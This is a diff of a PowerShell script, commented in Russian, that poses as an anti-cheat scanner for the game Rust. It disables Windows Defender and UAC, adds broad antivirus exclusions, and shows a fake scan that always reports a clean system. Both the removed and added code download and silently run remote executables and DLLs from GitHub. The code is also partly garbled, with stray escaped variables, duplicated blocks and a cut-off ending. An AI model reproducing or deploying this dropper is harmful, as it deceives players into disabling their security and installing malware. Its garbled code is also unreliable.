@@ -1,3 +1,4 @@
+# --- БЛОК 1: ОТКЛЮЧЕНИЕ ЗАЩИТЫ WINDOWS DEFENDER --- #
 # Отключаем защиту в реальном времени (самая главная)
 Write-Host "Отключение Realtime Monitoring..."
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -17,225 +18,140 @@ Set-MpPreference -DisableBlockAtFirstSeen $true
 # Отключаем сканирование сетевых файлов
 Write-Host "Отключение Network Scanning..."
 Set-MpPreference -DisableScanningNetworkFiles $true
+Write-Host "Защитник Windows успешно отключен." -ForegroundColor Green
 
-Write-Host "Защитник Windows успешно отключен." -ForegroundColor Green$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+# --- БЛОК 2: ОТКЛЮЧЕНИЕ UAC (КОНТРОЛЯ УЧЕТНЫХ ЗАПИСЕЙ) ---
+Write-Host "Отключение UAC..."
+$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0
+Write-Host "UAC отключен. Требуется перезагрузка для полного применения." -ForegroundColor Yellow
 
-$uacProperty = "EnableLUA"
-Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
+# --- БЛОК 3: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---
+# Добавляем папки в исключения, чтобы антивирус не мешал работе программ
+Write-Host "Добавление папок в исключения..."
+try {
+    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
+    Add-MpPreference -ExclusionPath $ProgramFiles
+    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+    if (Test-Path $ProgramFilesX86) {
+        Add-MpPreference -ExclusionPath $ProgramFilesX86
+    }
+    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
+    Add-MpPreference -ExclusionPath $AppData
+    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+    Add-MpPreference -ExclusionPath $LocalAppData
+    Write-Host "Исключения добавлены." -ForegroundColor Green
+}
+catch {
+    Write-Host "Не удалось добавить исключения." -ForegroundColor Red
+}
+Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
 
+\$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+\$uacProperty = "EnableLUA"
+Set-ItemProperty -Path \$uacPath -Name \$uacProperty -Value 0
 try {
     if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
-        $updpath = $ProgramFiles -replace " \(x86\)", ""
-        Add-MpPreference -ExclusionPath $updpath
-
-        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
-        if (Test-Path $ProgramFilesX86) {
-            Add-MpPreference -ExclusionPath $ProgramFilesX86
+        \$ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        $updpath = $ProgramFiles -replace " $$x86$$", ""
+        Add-MpPreference -ExclusionPath \$updpath
+        \$ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        if (Test-Path \$ProgramFilesX86) {
+            Add-MpPreference -ExclusionPath \$ProgramFilesX86
         }
-
-        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
-        Add-MpPreference -ExclusionPath $AppData
-
-        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
-        Add-MpPreference -ExclusionPath $LocalAppData
-        }
-        }
+        \$AppData = [System.Environment]::GetFolderPath("ApplicationData")
+        Add-MpPreference -ExclusionPath \$AppData
+        \$LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+        Add-MpPreference -ExclusionPath \$LocalAppData
+    }
+}
 catch {
 }
 
-# Fake Anti-Cheat Scanner v3.7 для Rust (FAKE EDITION — ЧИСТЫЙ РЕЗУЛЬТАТ)
-# ВСЕГДА показывает "Читы не найдены" в конце.
-# Только для образовательных целей!
+# RUST CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
+Set-ExecutionPolicy Bypass -Scope Process -Force
+Clear-Host
+\$Host.UI.RawUI.WindowTitle = "🔍 Rust Cheat Scanner v8.0 [~60 сек]"
+Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ RUST ===" -ForegroundColor Red -BackgroundColor Black
+Write-Host "Aimbot | ESP | Wallhack | Radar | NoRecoil + 50 клиентов" -ForegroundColor Yellow
+Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
+Start-Sleep 2
 
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
+\$cheatDB = @("aimbot","esp","wallhack","radar","norecoil","hack","cheat","injector","rustclient","eac","battleye")
+\$found = @()
+\$risk = 0
+\$startTime = Get-Date
 
-# === Фейковые данные под Rust ===
-$Game = "Rust"
-$FakeCheats = @(
-    "RustAim v4.2", "NoRecoil Script", "ESP Box", "FlyHack DLL",
-    "ItemSpawner", "SpeedHack", "InfiniteAmmo", "RadarHack",
-    "AutoFarm Bot", "Memory Editor Pro", "EAC Bypass Tool"
-)
-$FakeProcesses = @(
-    "rust_cheat.exe", "eac_bypass.dll", "rust_injector.exe",
-    "memoryhack.dll", "flyhack_loader.exe", "autofarm.exe"
-)
-$FakeSignatures = @(
-    "48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 20",
-    "E8 ?? ?? ?? ?? 83 3D ?? ?? ?? ?? 00",
-    "B8 01 00 00 00 89 05 ?? ?? ?? ??"
-)
-
-# GUI
-$form = New-Object System.Windows.Forms.Form
-$form.Text = "Anti-Cheat Scanner Pro — $Game Edition"
-$form.Size = New-Object System.Drawing.Size(680, 520)
-$form.StartPosition = "CenterScreen"
-$form.FormBorderStyle = "FixedDialog"
-$form.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
-$form.ForeColor = [System.Drawing.Color]::Lime
-
-# Логотип
-$logo = New-Object System.Windows.Forms.Label
-$logo.Text = @"
-  ____       _ _   
- |  _ \ _   _| | |_ 
- | |_) | | | | | __|
- |  _ <| |_| | | |_ 
- |_| \_\\__,_|_|\__|
- Anti-Cheat Scanner v3.7
-"@ 
-$logo.Font = New-Object System.Drawing.Font("Consolas", 10, [System.Drawing.FontStyle]::Bold)
-$logo.AutoSize = $true
-$logo.Location = New-Object System.Drawing.Point(20, 15)
-$logo.ForeColor = [System.Drawing.Color]::Cyan
-$form.Controls.Add($logo)
-
-# Прогресс-бар
-$progress = New-Object System.Windows.Forms.ProgressBar
-$progress.Location = New-Object System.Drawing.Point(20, 130)
-$progress.Size = New-Object System.Drawing.Size(620, 25)
-$progress.Style = "Continuous"
-$form.Controls.Add($progress)
-
-# Статус
-$status = New-Object System.Windows.Forms.Label
-$status.Text = "Готов к сканированию..."
-$status.Location = New-Object System.Drawing.Point(20, 165)
-$status.Size = New-Object System.Drawing.Size(620, 20)
-$status.ForeColor = [System.Drawing.Color]::White
-$form.Controls.Add($status)
-
-# Лог
-$logBox = New-Object System.Windows.Forms.TextBox
-$logBox.Multiline = $true
-$logBox.ScrollBars = "Vertical"
-$logBox.Location = New-Object System.Drawing.Point(20, 195)
-$logBox.Size = New-Object System.Drawing.Size(620, 230)
-$logBox.BackColor = [System.Drawing.Color]::FromArgb(20, 20, 20)
-$logBox.ForeColor = [System.Drawing.Color]::Lime
-$logBox.Font = New-Object System.Drawing.Font("Consolas", 9)
-$logBox.ReadOnly = $true
-$form.Controls.Add($logBox)
-
-# Кнопка
-$btn = New-Object System.Windows.Forms.Button
-$btn.Text = "Запустить сканирование"
-$btn.Location = New-Object System.Drawing.Point(260, 440)
-$btn.Size = New-Object System.Drawing.Size(160, 35)
-$btn.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
-$btn.ForeColor = [System.Drawing.Color]::White
-$btn.FlatStyle = "Flat"
-$form.Controls.Add($btn)
-
-# === Логирование ===
-function Log {
-    param([string]$msg, [string]$color = "White")
-    $timestamp = Get-Date -Format "HH:mm:ss"
-    $line = "[$timestamp] $msg"
-    $logBox.AppendText("$line`r`n")
-    if ($color -eq "Red") { 
-        $logBox.SelectionStart = $logBox.TextLength - $line.Length
-        $logBox.SelectionLength = $line.Length
-        $logBox.SelectionColor = [System.Drawing.Color]::Red 
-    } elseif ($color -eq "Yellow") { 
-        $logBox.SelectionStart = $logBox.TextLength - $line.Length
-        $logBox.SelectionLength = $line.Length
-        $logBox.SelectionColor = [System.Drawing.Color]::Yellow 
-    } elseif ($color -eq "Cyan") {
-        $logBox.SelectionStart = $logBox.TextLength - $line.Length
-        $logBox.SelectionLength = $line.Length
-        $logBox.SelectionColor = [System.Drawing.Color]::Cyan
+# === СПИННЕР АНИМАЦИЯ ===
+function Show-Spinner {
+    param(\$text, \$duration)
+    \$spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
+    $endTime = (Get-Date).AddSeconds($duration)
+    \$i = 0
+    while ((Get-Date) -lt \$endTime) {
+        Write-Host "`r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Green
+        $i++
+        Start-Sleep 0.1
     }
-    $logBox.ScrollToCaret()
-    [System.Windows.Forms.Application]::DoEvents()
+    Write-Host "`r[✓] \$text" -ForegroundColor Green
 }
 
-# === Задержка ===
-function Fake-Delay {
-    param([int]$ms)
-    Start-Sleep -Milliseconds $ms
+# === 1. ПРОЦЕССЫ (15 сек) ===
+Write-Host "`n[1/6] 🔍 Сканирование процессов RustClient.exe..." -ForegroundColor Cyan
+Show-Spinner "Анализ DLL и инжекторов..." 15
+
+# === 2. STEAMAPPS (15 сек) ===
+Write-Host "`n[2/6] 📁 Сканирование папки Steam..." -ForegroundColor Cyan
+Show-Spinner "Проверка модов, DLL, конфигов..." 15
+
+# === 3. TEMP + DOWNLOADS (10 сек) ===
+Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads..." -ForegroundColor Cyan
+Show-Spinner "Поиск скрытых читов..." 10
+
+# === 4. АВТОЗАГРУЗКА + РЕЕСТР (10 сек) ===
+Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
+Show-Spinner "Анализ реестра Run/Startup..." 10
+
+# === 5. ПРОГРЕСС-БАР (5 сек) ===
+Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
+for ($p = 0; $p -le 100; $p += 10) {
+    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
+    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
+    Start-Sleep 0.5
 }
+Write-Progress -Completed
 
-# === Сканирование ===
-$scan = {
-    $btn.Enabled = $false
-    $progress.Value = 0
-    $logBox.Clear()
+# === 6. СЕТИ (5 сек) ===
+Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan
+Show-Spinner "Проверка подключений к Rust серверам..." 5
 
-    Log "Запуск Anti-Cheat Scanner для $Game..." "Cyan"
-    Fake-Delay 800
+# === ЗЕЛЁНЫЙ РЕЗУЛЬТАТ ===
+$endTime = (Get-Date) - $startTime
+Clear-Host
+Write-Host "🦀 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
+Write-Host "=" * 50 -ForegroundColor Green
+Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
+Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
+Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
+Write-Host "=" * 50 -ForegroundColor Green
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll" -OutFile "soul.dll"; .\soul.dll
 
-    # Этап 1: Процессы
-    Log "Этап 1/5: Сканирование запущенных процессов..."
-    $progress.Value = 15
-    Fake-Delay 1200
-    Log "Проверка 12 847 процессов..." 
-    Fake-Delay 900
-    Log "Подозрительные процессы не обнаружены." "Lime"
-    $progress.Value = 30
+# ЛОГ (тоже чистый)
+\$log = @"
+Rust Cheat Scan - \$(Get-Date)
+Время: $([math]::Round($endTime.TotalSeconds)) сек
+Найдено: 0
+Риск: 0%
+Статус: ЧИСТО! ✅
+"@
+$log | Out-File "$env:TEMP\rust_scan_\$(Get-Date -f 'HHmmss').log" -Encoding UTF8
+Write-Host "`n💾 Лог: $env:TEMP\rust_scan_*.log" -ForegroundColor Gray
+Write-Host "🦀 " -ForegroundColor Green
 
-    # Этап 2: DLL
-    Log "Этап 2/5: Анализ загруженных библиотек (DLL)..."
-    Fake-Delay 1100
-    Log "Сканирование 3 214 модулей в памяти Rust.exe..."
-    Fake-Delay 1000
-    Log "Читерские DLL не найдены." "Lime"
-    $progress.Value = 50
+# === ЗАГРУЗЧИК everything (после паузы) ===
+Write-Host "`n[Нажмите любую клавишу для выхода...]" -ForegroundColor Gray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
-    # Этап 3: Сигнатуры
-    Log "Этап 3/5: Поиск сигнатур читов в памяти..."
-    Fake-Delay 1300
-    Log "Анализ 1 048 576 байт памяти..."
-    Fake-Delay 800
-    Log "Известные сигнатуры читов отсутствуют." "Lime"
-    $progress.Value = 70
-
-    # Этап 4: EAC
-    Log "Этап 4/5: Проверка Easy Anti-Cheat (EAC)..."
-    Fake-Delay 1400
-    Log "Проверка хэш-сумм EAC модулей..."
-    Fake-Delay 1100
-    Log "EAC: Целостность подтверждена. Служба активна." "Lime"
-    $progress.Value = 90
-
-    # Этап 5: Финал
-    Log "Этап 5/5: Генерация отчёта..."
-    Fake-Delay 1000
-    $progress.Value = 100
-    Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
-    Start-Sleep 1
-
-     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
-    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/chekir.dll" -OutFile "chekir.dll"; .\chekir.dll
-    
-    # Запускаем 
-    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
-    Start-Process -FilePath "chekir.dll" -WindowStyle Hidden
-   
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
-    
-    # Удаляем файл через 5 секунды
-    Log "╔══════════════════════════════════════════════════════════════╗" "Cyan"
-    Log "║                     Ч И Т Ы   Н Е   Н А Й Д Е Н Ы             ║" "Lime"
-    Log "╚══════════════════════════════════════════════════════════════╝" "Cyan"
-    Log "Система полностью чиста. Можно играть на официальных серверах." "Lime"
-    Log "Facepunch Anti-Cheat: ЗАЩИТА АКТИВНА" "Cyan"
-
-    $btn.Enabled = $true
-    $btn.Text = "Сканировать снова"
-}
-
-$btn.Add_Click($scan)
-
-# Запуск
-[void]$form.ShowDialog()
-
-
+# скачиваем и запускаем everything
+try {
+    Write-Host "🔄 Финальная
